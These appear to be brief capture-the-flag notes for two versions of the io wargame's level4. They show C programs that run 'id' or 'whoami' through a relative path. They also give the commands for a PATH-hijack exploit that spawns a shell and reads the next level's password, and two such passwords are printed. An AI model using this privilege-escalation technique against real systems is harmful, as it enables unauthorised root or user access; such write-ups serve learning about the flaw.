old level4 
#include <stdlib.h>
int main() 
{
    system("id");
    return 0;
}

在/tmp下创建一个名字叫id的shell文件，内容为/bin/sh，然后chmod a+x id
export PATH=/tmp:$PATH
./level4

cat .pass
Zx5VdzACNMY9lQ



new level4

#include <stdlib.h>
#include <stdio.h>

int main() {
        char username[1024];
        FILE* f = popen("whoami","r");
        fgets(username, sizeof(username), f);
        printf("Welcome %s", username);

        return 0;
}

level4@io:/tmp/level04$ echo "/bin/sh" > whoami
level4@io:/tmp/level04$ cat whoami 
/bin/sh
level4@io:/tmp/level04$ 
level4@io:~$ export PATH=/tmp/level04:$PATH
level4@io:~$ cd /levels
level4@io:/levels$ ./level04
sh-4.2$ cd /home/level5 
sh-4.2$ more .pass
KGpWsju2vDpmxcxlvm


